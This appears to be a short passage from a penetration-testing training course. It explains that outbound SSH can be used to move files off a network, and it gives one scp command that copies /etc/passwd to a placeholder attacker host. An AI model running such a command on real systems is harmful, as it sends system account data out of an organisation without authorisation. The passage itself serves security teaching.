----
We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. 

```bash
scp /etc/passwd htb-student@<attack-host-ip>:/home/htb-student/
```